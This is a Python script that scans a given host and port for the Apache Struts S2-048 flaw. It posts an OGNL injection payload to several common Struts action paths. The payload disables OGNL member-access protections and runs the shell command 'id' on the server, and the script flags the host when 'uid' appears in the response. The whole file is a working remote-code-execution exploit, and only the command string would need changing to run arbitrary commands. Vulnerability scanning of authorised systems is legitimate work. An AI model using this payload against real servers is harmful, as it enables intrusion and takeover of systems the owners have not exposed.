try:
    import requests,sys,os,logging,queue
except:
    os._exit(6)
logging.basicConfig(level=logging.INFO,format='%(message)s')
class VulTest:
    def __init__(self, url,port):
        dirs = ['/Simple!addInput.action','/Simple.action','/addUser.action','/listUser.action','/helloworld.action','/integration/saveGangster.action']
        self.queues = queue.Queue(len(dirs))
        if '://' not in url:
            self.ip = url
            for dir in dirs :
                urls = 'http://' + url+":"+port + dir
                self.queues.put(urls)


    def Test(self):
        while not self.queues.empty():
            url = self.queues.get(False)
            data = {
        "name": '''%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())).(#q)}''',
        "age": "1",
        "__checkbox_bustedBefore": "true",
        "description": ""
            }
            try:
                req = requests.post(url  , data=data,timeout=3)
            
                if ('uid' in req.text):
                    logging.info('[+] Found S2-048 in ' + self.ip)
                    os._exit(1)
            except:
                pass

        logging.info('[-] S2-048 Not Found in ' + self.ip)
        os._exit(2)


if __name__ == '__main__':
    url = sys.argv[1]
    port = sys.argv[2]
    #url = '192.168.136.130'
    test = VulTest(url,port)
    try:
        test.Test()
    except:
        os._exit(3)
    

